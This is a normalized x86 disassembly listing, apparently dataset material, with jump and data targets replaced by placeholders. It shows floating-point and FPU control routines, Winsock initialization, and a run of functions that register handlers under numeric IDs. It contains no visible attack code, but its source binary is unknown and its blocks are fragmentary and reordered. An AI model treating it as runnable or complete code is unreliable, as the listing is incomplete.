mov [ ebp - 0x20 ] esi
jmp r-xdata
mov esi 0xbffd
cmp di si
ja r-xdata
xor eax eax
jmp r-xdata
cmp ebx [ ebp - 0x40 ]
jae r-xdata
mov ecx [ ebp - 0x40 ]
jmp r-xdata
lea eax [ esi + 0x1 ]
xor edx edx
cmp eax esi
jb r-xdata
cmp edi edx
jae r-xdata
mov [ ebp - 0x54 ] eax
lea edi [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc esi
test [ ebp - 0x28 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] eax
jne r-xdata
cmp ebx esi
jne r-xdata
mov esi 0x3fbf
cmp di si
ja r-xdata
cmp [ ebx ] 0x39
jne r-xdata
mov eax [ ebp - 0x64 ]
cmp ebx [ ebp - 0x40 ]
jae r-xdata
cmp ebx ecx
jae r-xdata
xor edx edx
inc edx
cmp eax 0x1
jae r-xdata
mov eax [ ebp - 0x38 ]
lea edx [ eax + esi ]
mov [ ebp - 0x44 ] edx
cmp edx esi
jb r-xdata
add edi 0x2
inc [ ebp - 0x54 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x58 ] ecx
lea eax [ ebp + eax - 0x20 ]
cmp [ ebp - 0x2c ] eax
jne r-xdata
cmp [ ebp - 0x20 ] eax
jne r-xdata
xor esi esi
cmp dx si
jne r-xdata
xor esi esi
mov [ ebx ] 0x30
dec ebx
inc [ ebx ]
inc ebx
inc [ eax ]
cmp [ ebx ] 0x30
jne r-xdata
mov eax [ ebp - 0x64 ]
cmp ebx ecx
jae r-xdata
inc ecx
mov esi eax
test edx edx
je r-xdata
inc ecx
cmp edx eax
jae r-xdata
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x40 ]
add eax eax
mov [ ebp - 0x48 ] ecx
test ecx ecx
jle r-xdata
add esi 0xc002
test si si
jle r-xdata
mov [ ebp - 0x44 ] 0x1
cmp ebx ecx
jae r-xdata
cmp [ ebp - 0x30 ] eax
je r-xdata
mov [ ebp - 0x16 ] ax
jmp r-xdata
cmp cx si
jne r-xdata
inc edi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
dec ebx
sub bl al
sub bl 0x3
movsx ecx bl
mov [ eax + 0x3 ] bl
mov [ ecx + eax + 0x4 ] 0x0
mov eax [ ebp - 0x74 ]
xor edx edx
mov [ eax ] dx
mov edx 0x8000
cmp [ ebp - 0x60 ] dx
mov [ eax + 0x3 ] 0x1
setne dl
dec dl
and dl 0xd
add dl 0x20
mov [ eax + 0x2 ] dl
mov [ ecx ] 0x30
mov [ eax + 0x5 ] 0x0
jmp r-xdata
add ecx [ ebp - 0x34 ]
shr edx 0x1f
add ecx ecx
or ecx edx
lea esi [ edi + edi ]
mov [ ebp - 0x20 ] esi
mov esi [ ebp - 0x44 ]
mov [ ebp - 0x18 ] ecx
shr ecx 0x18
add esi esi
add cl 0x30
mov eax edi
shr eax 0x1f
or esi eax
mov [ ebx ] cl
inc ebx
dec [ ebp - 0x4c ]
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x15 ] 0x0
jg r-xdata
add esi 0xffff
test si si
jns r-xdata
mov edi [ ebp - 0x8 ]
test edi edi
js r-xdata
sub [ ebp - 0x58 ] 0x2
add eax 0x2
dec [ ebp - 0x48 ]
cmp [ ebp - 0x48 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x44 ] 0x0
mov [ edi - 0x4 ] ebx
je r-xdata
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] eax
jmp r-xdata
and [ ebp - 0x54 ] esi
lea esi [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc edi
test [ eax + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] esi
jne r-xdata
mov eax 0x8000
cmp [ ebp - 0x10 ] ax
ja r-xdata
mov eax esi
neg eax
movzx eax ax
add esi eax
test si si
jg r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
shl [ ebp - 0x10 ] 0x1
mov edx eax
add eax eax
shr ecx 0x1f
or eax ecx
mov [ ebp - 0xc ] eax
shr edx 0x1f
lea eax [ edi + edi ]
or eax edx
add esi 0xffff
mov [ ebp - 0x8 ] eax
test si si
jg r-xdata
mov ecx [ ebp - 0x58 ]
movzx edx [ eax ]
movzx ecx [ ecx ]
and [ ebp - 0x44 ] 0x0
imul ecx edx
mov edx [ edi - 0x4 ]
lea ebx [ edx + ecx ]
cmp ebx edx
jb r-xdata
add esi 0x2
inc [ ebp - 0x54 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea ecx [ ebp + ecx - 0x20 ]
add eax 0x8
mov [ ebp - 0x70 ] ecx
mov [ ebp - 0x6c ] eax
cmp [ eax + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x20 ] esi
jne r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x10 ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr edi 0x1
or edi ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec eax
mov [ ebp - 0xc ] edi
mov [ ebp - 0x10 ] ecx
jne r-xdata
inc [ ebp - 0x50 ]
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x40 ]
add ecx ecx
mov [ ebp - 0x50 ] edx
test edx edx
jle r-xdata
add edi 0xc002
test di di
jle r-xdata
mov [ ebp - 0x5c ] 0x1
cmp eax ecx
jae r-xdata
cmp [ eax ] esi
je r-xdata
xor eax eax
mov [ ebp - 0x16 ] ax
jmp r-xdata
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp si ax
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] eax
je r-xdata
add edi 0xffff
test di di
jns r-xdata
test [ ebp - 0x8 ] 0x80000000
jne r-xdata
add [ ebp - 0x70 ] 0x2
sub [ ebp - 0x6c ] 0x2
dec [ ebp - 0x50 ]
cmp [ ebp - 0x50 ] 0x0
jg r-xdata
inc [ esi ]
cmp [ ebp - 0x5c ] 0x0
mov [ esi - 0x4 ] eax
je r-xdata
mov [ ebp - 0x18 ] esi
mov ax [ ebp - 0xe ]
or esi [ ebp - 0x5c ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] si
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x5c ] ax
mov [ ebp - 0x1c ] eax
sete cl
mov [ ebp - 0x20 ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
jmp r-xdata
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x6 ] cx
jne r-xdata
or [ ebp - 0x10 ] 0x1
mov eax 0x8000
cmp [ ebp - 0x10 ] ax
ja r-xdata
mov eax edi
neg eax
movzx eax ax
add edi eax
test di di
jg r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
shl [ ebp - 0x10 ] 0x1
mov edx eax
add eax eax
shr ecx 0x1f
or eax ecx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
shr edx 0x1f
add eax eax
or eax edx
add edi 0xffff
mov [ ebp - 0x8 ] eax
test di di
jg r-xdata
mov eax [ ebp - 0x70 ]
movzx ecx [ eax ]
mov eax [ ebp - 0x6c ]
movzx eax [ eax ]
mov edx [ esi - 0x4 ]
imul ecx eax
and [ ebp - 0x5c ] 0x0
lea eax [ edx + ecx ]
cmp eax edx
jb r-xdata
mov eax [ ebp - 0x44 ]
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] ax
inc esi
jmp r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x10 ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr esi 0x1
or esi ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec eax
mov [ ebp - 0xc ] esi
mov [ ebp - 0x10 ] ecx
jne r-xdata
inc [ ebp - 0x48 ]
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp di ax
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x48 ] eax
je r-xdata
mov ax [ ebp - 0xe ]
or edi [ ebp - 0x58 ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] di
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x58 ] ax
mov [ ebp - 0x1c ] eax
sete cl
mov [ ebp - 0x20 ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x6 ] cx
jne r-xdata
or [ ebp - 0x10 ] 0x1
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] ax
inc edi
jmp r-xdata
sub_41a2bc
xor eax eax
test bl 0x10
je r-xdata
test bl 0x8
je r-xdata
inc eax
test bl 0x4
je r-xdata
or eax 0x4
test bl 0x2
je r-xdata
or eax 0x8
test bl 0x1
je r-xdata
or eax 0x10
test ebx 0x80000
je r-xdata
or eax 0x20
mov ecx ebx
mov edx 0x300
and ecx edx
push esi
mov esi 0x200
je r-xdata
or eax 0x2
mov ecx ebx
and ecx 0x30000
je r-xdata
cmp ecx 0x100
je r-xdata
or eax edx
cmp ecx 0x10000
jne r-xdata
or eax 0x400
cmp ecx esi
je r-xdata
retn
or eax 0x1000
pop esi
test ebx 0x40000
je r-xdata
or eax esi
jmp r-xdata
or eax 0x800
jmp r-xdata
cmp ecx edx
jne r-xdata
or eax 0xc00
jmp r-xdata
sub_41a34a
xor eax eax
test dl 0x10
je r-xdata
push ebx
push esi
push edi
mov ebx 0x200
test dl 0x8
je r-xdata
mov eax 0x80
test dl 0x4
je r-xdata
or eax ebx
test dl 0x2
je r-xdata
or eax 0x400
test dl 0x1
je r-xdata
or eax 0x800
mov edi 0x100
test edx 0x80000
je r-xdata
or eax 0x1000
mov ecx edx
mov esi 0x300
and ecx esi
je r-xdata
or eax edi
mov ecx 0x3000000
pop edi
and edx ecx
pop esi
pop ebx
cmp edx 0x1000000
je r-xdata
cmp ecx edi
je r-xdata
or eax 0x8040
cmp edx 0x2000000
je r-xdata
or eax 0x2000
cmp ecx ebx
je r-xdata
or eax 0x40
retn
cmp edx ecx
jne r-xdata
or eax 0x4000
jmp r-xdata
cmp ecx esi
jne r-xdata
retn
or eax 0x8000
retn
or eax 0x6000
jmp r-xdata
sub_41a3ea
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
fwait
fnstcw [ ebp - 0x4 ]
mov bx [ ebp - 0x4 ]
xor edx edx
test bl 0x1
je r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test bl 0x8
je r-xdata
or edx 0x8
test bl 0x10
je r-xdata
or edx 0x4
test bl 0x20
je r-xdata
or edx 0x2
test bl 0x2
je r-xdata
or edx 0x1
movzx ecx bx
mov eax ecx
mov esi 0xc00
and eax esi
mov edi 0x300
je r-xdata
or edx 0x80000
and ecx edi
je r-xdata
cmp eax 0x400
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
mov edi [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax edi
not eax
and eax edx
and ecx edi
or eax ecx
mov [ ebp + 0xc ] eax
cmp eax edx
je r-xdata
or edx 0x40000
movzx eax bx
test eax 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
xor esi esi
cmp [ rw-data ] esi
je r-xdata
mov ebx eax
call sub_41a2bc
movzx eax ax
mov [ ebp - 0x8 ] eax
fldcw [ ebp - 0x8 ]
fwait
fnstcw [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
xor edx edx
test bl 0x1
je r-xdata
or edx edi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
and edi 0x308031f
mov [ ebp - 0x14 ] edi
stmxcsr [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
test al al
jns r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test eax 0x200
je r-xdata
push 0x10
pop esi
test bl 0x8
je r-xdata
or edx 0x8
test eax 0x400
je r-xdata
or esi 0x8
test bl 0x10
je r-xdata
or edx 0x4
test eax 0x800
je r-xdata
or esi 0x4
test bl 0x20
je r-xdata
or edx 0x2
test eax 0x1000
je r-xdata
or esi 0x2
test bl 0x2
je r-xdata
or edx 0x1
test eax 0x100
je r-xdata
or esi 0x1
movzx ecx bx
mov eax ecx
and eax esi
je r-xdata
or edx 0x80000
mov ecx eax
mov ebx 0x6000
and ecx ebx
je r-xdata
or esi 0x80000
and ecx 0x300
je r-xdata
cmp eax 0x400
je r-xdata
mov edi 0x8040
and eax edi
sub eax 0x40
je r-xdata
cmp ecx 0x2000
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
or esi 0x2000000
sub eax 0x7fc0
je r-xdata
or esi 0x100
cmp ecx 0x4000
je r-xdata
mov [ ebp + 0xc ] edx
mov eax edx
or edx 0x40000
test ebx 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
call sub_41a34a
push eax
mov [ ebp - 0xc ] eax
call sub_41a8e0
pop ecx
stmxcsr [ ebp - 0xc ]
mov ecx [ ebp - 0xc ]
xor edx edx
test cl cl
jns r-xdata
mov eax esi
jmp r-xdata
or esi 0x3000000
jmp r-xdata
sub eax 0x40
jne r-xdata
or esi 0x200
jmp r-xdata
cmp ecx ebx
jne r-xdata
or edx 0x300
jmp r-xdata
test ecx 0x200
je r-xdata
push 0x10
pop edx
mov ecx eax
xor ecx [ ebp + 0xc ]
or eax [ ebp + 0xc ]
test ecx 0x8031f
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx eax
and eax [ ebp + 0x8 ]
not edx
and edx esi
or edx eax
cmp edx esi
jne r-xdata
or esi 0x1000000
jmp r-xdata
or esi 0x300
jmp r-xdata
test ecx 0x400
je r-xdata
or edx 0x8
or eax 0x80000000
test ecx 0x800
je r-xdata
or edx 0x4
test ecx 0x1000
je r-xdata
or edx 0x2
mov esi 0x100
test esi ecx
je r-xdata
or edx 0x1
mov eax ecx
and eax ebx
je r-xdata
or edx 0x80000
and ecx edi
sub ecx 0x40
je r-xdata
cmp eax 0x2000
je r-xdata
or edx 0x2000000
sub ecx 0x7fc0
je r-xdata
or edx esi
cmp eax 0x4000
je r-xdata
or edx 0x3000000
jmp r-xdata
sub ecx 0x40
jne r-xdata
or edx 0x200
jmp r-xdata
cmp eax ebx
jne r-xdata
mov eax edx
or edx 0x1000000
jmp r-xdata
or edx 0x300
jmp r-xdata
sub_41a6fc
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0x10 ]
push ebx
xor ebx ebx
push esi
push edi
mov [ ebp - 0x4 ] 0x404e
mov [ eax ] ebx
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
cmp [ ebp + 0xc ] ebx
jbe r-xdata
cmp [ eax + 0x8 ] ebx
jne r-xdata
mov [ ebp + 0x10 ] ebx
mov edi [ eax + 0x8 ]
test edi 0x8000
jne r-xdata
mov edx [ eax + 0x4 ]
mov [ ebp + 0x10 ] 0x1
cmp edx [ ebp - 0x18 ]
jae r-xdata
mov cx [ ebp - 0x4 ]
pop edi
pop esi
mov [ eax + 0xa ] cx
pop ebx
leave
retn
mov ecx [ eax + 0x4 ]
mov ecx [ eax ]
add [ ebp - 0x4 ] 0xfff0
mov edi edx
mov esi ecx
shr esi 0x10
shl edx 0x10
shr edi 0x10
or edx esi
shl ecx 0x10
mov [ eax + 0x4 ] edx
mov [ eax ] ecx
cmp edi ebx
je r-xdata
mov [ eax + 0x8 ] edi
mov esi [ ebp - 0x14 ]
and [ ebp + 0x10 ] 0x0
lea ebx [ edi + esi ]
cmp ebx edi
jb r-xdata
mov esi [ ebp - 0x8 ]
and [ ebp + 0x10 ] 0x0
lea edi [ esi + 0x1 ]
cmp edi esi
jb r-xdata
cmp [ ebp + 0x10 ] 0x0
mov [ eax ] edx
je r-xdata
mov ebx [ eax ]
add [ ebp - 0x4 ] 0xffff
mov esi ecx
mov edx ebx
shr esi 0x1f
add edi edi
shr edx 0x1f
add ecx ecx
or edi esi
add ebx ebx
or ecx edx
mov [ eax ] ebx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] edi
test edi 0x8000
je r-xdata
mov [ ebp + 0x10 ] 0x1
cmp ebx esi
jae r-xdata
mov [ ebp + 0x10 ] 0x1
cmp edi 0x1
jae r-xdata
add ecx [ ebp - 0x10 ]
and [ ebp - 0x8 ] 0x0
mov edi ebx
add ecx ecx
mov esi edx
shr edi 0x1f
or ecx edi
shr esi 0x1f
add ebx ebx
add edx edx
or ebx esi
mov [ eax + 0x8 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp + 0x10 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
movsx esi [ ecx ]
lea ecx [ edx + esi ]
mov [ ebp - 0x18 ] esi
cmp ecx edx
jb r-xdata
inc ecx
mov [ eax + 0x8 ] ecx
cmp [ ebp + 0x10 ] 0x0
mov [ eax + 0x4 ] ebx
je r-xdata
inc ecx
mov [ eax + 0x8 ] ecx
cmp [ ebp + 0x10 ] 0x0
mov [ eax + 0x4 ] edi
je r-xdata
mov [ ebp - 0x8 ] 0x1
cmp ecx esi
jae r-xdata
dec [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
inc [ ebp + 0x8 ]
cmp [ ebp + 0xc ] 0x0
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ecx
ja r-xdata
lea ecx [ ebx + 0x1 ]
xor edx edx
cmp ecx ebx
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
mov [ eax ] ecx
je r-xdata
mov ecx [ eax ]
mov esi eax
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edx ecx
lea edi [ ecx + ecx ]
shr edx 0x1f
lea ecx [ ebx + ebx ]
or ecx edx
mov edx [ ebp + 0x10 ]
and [ ebp + 0x10 ] 0x0
mov esi ebx
mov ebx ecx
mov [ ebp - 0x8 ] edi
shr esi 0x1f
add edx edx
or edx esi
mov esi [ ebp - 0x8 ]
add ecx ecx
shr edi 0x1f
or ecx edi
mov edi ecx
mov [ ebp - 0x8 ] ecx
lea ecx [ edx + edx ]
mov edx [ ebp - 0x18 ]
add esi esi
shr ebx 0x1f
or ecx ebx
add edx esi
mov [ eax ] esi
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] ecx
cmp edx esi
jb r-xdata
xor ebx ebx
xor edx edx
inc edx
cmp ecx 0x1
jae r-xdata
mov ecx [ ebp - 0xc ]
inc ecx
mov [ ebp + 0x10 ] ecx
mov [ eax + 0x8 ] ecx
mov ebx ecx
mov [ eax + 0x4 ] ecx
test edx edx
je r-xdata
sub_41a8e0
push 0x8
push r--data
call sub_402e60
xor eax eax
cmp [ rw-data ] eax
je r-xdata
call sub_402ea5
retn
test [ ebp + 0x8 ] 0x40
je r-xdata
and [ ebp + 0x8 ] 0xffffffbf
ldmxcsr [ ebp + 0x8 ]
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
ldmxcsr [ ebp + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
sub_41b275
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x190
lea eax [ esp ]
push eax
push 0x2
call [ WSAStartup@IAT ]
push WSACleanup
call sub_4023d4
pop ecx
mov esp ebp
pop ebp
retn
sub_41b29c
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x11c
push esi
lea ecx [ esp + 0x8 ]
call sub_4010f7
lea eax [ esp + 0x8 ]
push eax
mov [ esp + 0xc ] sub_40bbce
mov [ esp + 0x10 ] 0x70707617
mov [ esp + 0x14 ] 0x64
call sub_40f29b
mov esi eax
call sub_40e269
pop esi
mov esp ebp
pop ebp
retn
sub_41b2f8
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x11c
push esi
lea ecx [ esp + 0x8 ]
call sub_4010f7
lea eax [ esp + 0x8 ]
push eax
mov [ esp + 0xc ] sub_40b5b3
mov [ esp + 0x10 ] 0x80a5f801
mov [ esp + 0x14 ] 0x64
mov [ esp + 0x120 ] 0x1
call sub_40f29b
mov esi eax
call sub_40e2ad
pop esi
mov esp ebp
pop ebp
retn
sub_41b344
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x11c
push esi
lea ecx [ esp + 0x8 ]
call sub_4010f7
lea eax [ esp + 0x8 ]
push eax
mov [ esp + 0xc ] sub_415ede
mov [ esp + 0x10 ] 0x79339801
mov [ esp + 0x14 ] 0x5
call sub_40f29b
mov esi eax
call sub_40e269
pop esi
mov esp ebp
pop ebp
retn
sub_41b388
mov eax sub_41b170
call sub_416a8c
push esi
mov esi rw-data
call sub_40c9fb
or [ esp + 0xc ] 0xffffffff
push sub_41bc44
call sub_4023d4
pop ecx
mov ecx [ esp + 0x4 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_41b3bb
mov eax sub_41b210
call sub_416a8c
push esi
mov esi rw-data
call sub_40c9fb
or [ esp + 0xc ] 0xffffffff
push sub_41bc6c
call sub_4023d4
pop ecx
mov ecx [ esp + 0x4 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_41b3ee
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x11c
push esi
lea ecx [ esp + 0x8 ]
call sub_4010f7
lea eax [ esp + 0x8 ]
push eax
mov [ esp + 0xc ] sub_415c93
mov [ esp + 0x10 ] 0x80780001
mov [ esp + 0x14 ] 0xa
call sub_40f29b
mov esi eax
call sub_40e2ad
pop esi
mov esp ebp
pop ebp
retn
sub_41b432
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x11c
push esi
lea ecx [ esp + 0x8 ]
call sub_4010f7
lea eax [ esp + 0x8 ]
push eax
mov [ esp + 0xc ] sub_4162bf
mov [ esp + 0x10 ] 0x80760002
mov [ esp + 0x14 ] 0xf
call sub_40f29b
mov esi eax
call sub_40e2ad
pop esi
mov esp ebp
pop ebp
retn
sub_41b476
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x11c
push esi
lea ecx [ esp + 0x8 ]
call sub_4010f7
lea eax [ esp + 0x8 ]
push eax
mov [ esp + 0xc ] sub_41224b
mov [ esp + 0x10 ] 0x80156501
mov [ esp + 0x14 ] 0x64
mov [ esp + 0x120 ] 0x1
call sub_40f29b
mov esi eax
call sub_40e2ad
pop esi
mov esp ebp
pop ebp
retn
sub_41b500
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x11c
push esi
lea ecx [ esp + 0x8 ]
call sub_4010f7
lea eax [ esp + 0x8 ]
push eax
mov [ esp + 0xc ] sub_41616b
mov [ esp + 0x10 ] 0x80cd9101
mov [ esp + 0x14 ] 0x64
mov [ esp + 0x120 ] 0x1
call sub_40f29b
mov esi eax
call sub_40e2ad
pop esi
mov esp ebp
pop ebp
retn
sub_41b602
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x11c
push esi
lea ecx [ esp + 0x8 ]
call sub_4010f7
lea eax [ esp + 0x8 ]
push eax
mov [ esp + 0xc ] sub_40a3f2
mov [ esp + 0x10 ] 0x70aa0201
mov [ esp + 0x14 ] 0x5a
call sub_40f29b
mov esi eax
call sub_40e269
pop esi
mov esp ebp
pop ebp
retn
sub_41b684
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x11c
push esi
lea ecx [ esp + 0x8 ]
call sub_4010f7
lea eax [ esp + 0x8 ]
push eax
mov [ esp + 0xc ] sub_411757
mov [ esp + 0x10 ] 0x8094e303
mov [ esp + 0x14 ] 0x64
mov [ esp + 0x120 ] 0x1
call sub_40f29b
mov esi eax
call sub_40e2ad
pop esi
mov esp ebp
pop ebp
retn
sub_41b6d0
push ebx
push esi
mov [ rw-data ] sub_414879
mov [ rw-data ] 0x40412402
mov [ rw-data ] 0x64
mov [ rw-data ] 0x927c0
call sub_40f29b
mov ebx rw-data
mov esi eax
call sub_40e355
pop esi
pop ebx
retn
sub_41b70e
push ebx
push esi
mov [ rw-data ] sub_40967c
mov [ rw-data ] 0x40920001
mov [ rw-data ] 0x32
mov [ rw-data ] 0xdbba0
call sub_40f29b
mov ebx rw-data
mov esi eax
call sub_40e355
pop esi
pop ebx
retn
sub_41b74c
push ebx
push esi
mov [ rw-data ] sub_410cad
mov [ rw-data ] 0x40211202
mov [ rw-data ] 0x50
mov [ rw-data ] 0x927c0
call sub_40f29b
mov ebx rw-data
mov esi eax
call sub_40e355
pop esi
pop ebx
retn
sub_41b78a
push ebx
push esi
mov [ rw-data ] sub_413c5c
mov [ rw-data ] 0x10018101
mov [ rw-data ] 0x14
mov [ rw-data ] 0x0
call sub_40f29b
mov ebx rw-data
mov esi eax
call sub_40e3d7
pop esi
pop ebx
retn
sub_41b7c5
push ebx
push esi
mov [ rw-data ] sub_40948c
mov [ rw-data ] 0x10000301
mov [ rw-data ] 0x32
mov [ rw-data ] 0x0
call sub_40f29b
mov ebx rw-data
mov esi eax
call sub_40e3d7
pop esi
pop ebx
retn
sub_41b800
push ebx
push esi
mov [ rw-data ] sub_408633
mov [ rw-data ] 0x30383201
mov [ rw-data ] 0x64
mov [ rw-data ] 0x927c0
call sub_40f29b
mov ebx rw-data
mov esi eax
call sub_40e50e
pop esi
pop ebx
retn
sub_41b83e
push ebx
push esi
mov [ rw-data ] sub_408290
mov [ rw-data ] 0x30290001
mov [ rw-data ] 0x32
mov [ rw-data ] 0x124f80
call sub_40f29b
mov ebx rw-data
mov esi eax
call sub_40e50e
pop esi
pop ebx
retn
sub_41b87c
push ebx
push esi
mov [ rw-data ] sub_407eee
mov [ rw-data ] 0x30177102
mov [ rw-data ] 0x50
mov [ rw-data ] 0x124f80
call sub_40f29b
mov ebx rw-data
mov esi eax
call sub_40e50e
pop esi
pop ebx
retn
sub_41b8ba
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x11c
push esi
lea ecx [ esp + 0x8 ]
call sub_4010f7
lea eax [ esp + 0x8 ]
push eax
mov [ esp + 0xc ] sub_4155fd
mov [ esp + 0x10 ] 0x74447101
mov [ esp + 0x14 ] 0x32
call sub_40f29b
mov esi eax
call sub_40e269
pop esi
mov esp ebp
pop ebp
retn
sub_41b8fe
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x11c
push esi
lea ecx [ esp + 0x8 ]
call sub_4010f7
lea eax [ esp + 0x8 ]
push eax
mov [ esp + 0xc ] sub_414036
mov [ esp + 0x10 ] 0x80f80001
mov [ esp + 0x14 ] 0xa
call sub_40f29b
mov esi eax
call sub_40e2ad
pop esi
mov esp ebp
pop ebp
retn
sub_41b942
mov eax sub_41b1fc
call sub_416a8c
push esi
mov esi rw-data
call sub_40c9fb
or [ esp + 0xc ] 0xffffffff
push sub_41bcd9
call sub_4023d4
pop ecx
mov ecx [ esp + 0x4 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_41b98d
mov eax sub_41b1e8
call sub_416a8c
push esi
mov esi rw-data
call sub_40c9fb
or [ esp + 0xc ] 0xffffffff
push sub_41bd0e
call sub_4023d4
pop ecx
mov ecx [ esp + 0x4 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_41b9c0
mov eax sub_41b1d4
call sub_416a8c
push esi
mov esi rw-data
call sub_40c9fb
or [ esp + 0xc ] 0xffffffff
push sub_41bd36
call sub_4023d4
pop ecx
mov ecx [ esp + 0x4 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_41b9f3
mov eax sub_41b1c0
call sub_416a8c
push esi
mov esi rw-data
call sub_40c9fb
or [ esp + 0xc ] 0xffffffff
push sub_41bd5e
call sub_4023d4
pop ecx
mov ecx [ esp + 0x4 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_41ba26
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x11c
push esi
lea ecx [ esp + 0x8 ]
call sub_4010f7
lea eax [ esp + 0x8 ]
push eax
mov [ esp + 0xc ] sub_413b36
